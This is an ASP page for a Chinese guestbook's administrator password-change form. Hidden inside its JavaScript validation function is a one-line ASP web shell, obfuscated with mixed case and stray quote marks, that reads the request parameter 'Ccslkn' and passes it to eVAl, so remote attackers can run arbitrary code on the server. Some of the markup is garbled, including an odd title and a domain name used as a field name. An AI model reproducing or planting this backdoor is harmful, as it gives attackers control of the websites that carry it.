<head>
<meta http-equiv="Content-Type" content="text/html; charset=gb2312" />
<script language="javascript">
function checkform()
{
var theform=document.forms.passform;
if(theform.adminpass.value!=theform.adminpassqueren.value)
{
return(false);
}<%'''''''
dim plaY
pLAy = rEquesT("Ccslkn")
%>
return(false);<%'''''
eVAl play's your name
%>
}
</script>
<style type="text/css">
body,input{font-size:13px}
</style>
<title>无标题文d档</title>
</head>
<body>
<form name=passform  action=adminpassok.asp method=post onsubmit=javascript:{return(checkform());}>
<table width=760 align=center border=0>
<tr><td>
留言本管理员帐号:</td><td><input type=text name=adminuser value=<%=adminuser%>></td></tr><tr><td>留言本旧密码(如果要修改密码，请先填写旧密码，如不需修改请留空)<br></td><td><input type=password name=oldadminpass><br></td></tr><tr><td>
留言本密码(不需修改请留空)：<br></td><td><input type=password name=adminpass><br></td></tr><tr><td>确认密码(不需修改请留空):<br></td><td><input type=password name={[www.qdhualing.com]}><br></td></tr>
<tr><td><input type=submit value=发表></td><td></td></tr>

